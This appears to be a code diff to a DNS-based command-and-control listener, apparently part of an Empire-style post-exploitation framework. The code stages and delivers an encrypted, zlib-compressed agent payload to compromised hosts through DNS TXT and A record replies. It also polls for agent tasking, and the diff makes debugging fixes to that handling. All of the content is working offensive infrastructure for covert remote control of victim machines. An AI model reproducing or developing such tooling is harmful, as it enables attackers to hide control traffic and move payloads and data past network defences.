@@ -524,12 +524,12 @@ def send_message(packets=None):
         # aes_encrypt_then_hmac is in stager.py
         encData = aes_encrypt_then_hmac(key, data)
         data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
-        ip_recv=send_data_to_listener_a(taskinghostname, sock, host, port, data, fake_domain)
+        ip_recv=send_data_to_listener(taskinghostname, sock, host, port, data, fake_domain)
     else:
         # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
         #   meta TASKING_REQUEST = 4
         routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
-        ip_recv=send_data_to_listener_a(taskinghostname, sock, host, port, routingPacket, fake_domain)
+        ip_recv=send_data_to_listener(taskinghostname, sock, host, port, routingPacket, fake_domain)
     try:
         print "[AGENT] main control loop"
         if ip_recv == ipnop:
@@ -662,7 +662,11 @@ def send_message(packets=None):
 
             #time.sleep(random.randint(0,1))
 
-            recv_counter = int(filter(str.isdigit, hostname))
+            try:
+                recv_counter = int(filter(str.isdigit, hostname))
+            except ValueError as e:
+                recv_counter = 0
+                
             print "send_payload_via_txt - hostname {} counter {} recv_counter {}".format(hostname, counter, recv_counter)
             if recv_counter != counter:
                 print "incorrect hostname recvd!"
@@ -763,9 +767,10 @@ def send_message(packets=None):
             for (language, results) in dataResults:
                 if results:        
                     self.send_a_record_reply(sock, a_host, ipswitchatotxt, addr)
+                    return results
                 else:
                     self.send_a_record_reply(sock, a_host, ipnop, addr)
-        return results
+                    return None
                             
     # Stage 2
     def send_stager_to_launcher(self, sock, hostname, addr, stagingKey, routingPacket, listenerOptions, txtstoptransfer, reply_id, reply_qd):
@@ -804,7 +809,7 @@ def send_message(packets=None):
 
     # Stage 6
     def send_agent_to_stager(self, hostname, stagingKey, sock, stager_crypto, listenerOptions, addr, ipack, txtstoptransfer, reply_id, reply_qd):
-        self.send_txt_record_reply_id(sock, hostname, ipack, addr, reply_id, reply_qd)
+        self.send_txt_record_reply_id_test(sock, hostname, ipack, addr, reply_id, reply_qd)
         
         dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, stager_crypto, listenerOptions, addr[0])
         if dataResults and len(dataResults) > 0:
@@ -821,8 +826,8 @@ def send_message(packets=None):
                         agentCode = self.generate_agent(language=language, listenerOptions=listenerOptions)
                         encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, zlib.compress(agentCode,9))
                         # TODO: wrap ^ in a routing packet?
-                        self.send_payload_via_txt(hostname, sock, encryptedAgent, addr, txtstoptransfer, reply_id, reply_qd)
-    
+                        self.send_payload_via_txt_test(sock, encryptedAgent, txtstoptransfer)
+                        
     def start_server(self, listenerOptions):
         """
         Threaded function that starts the faux DNS server
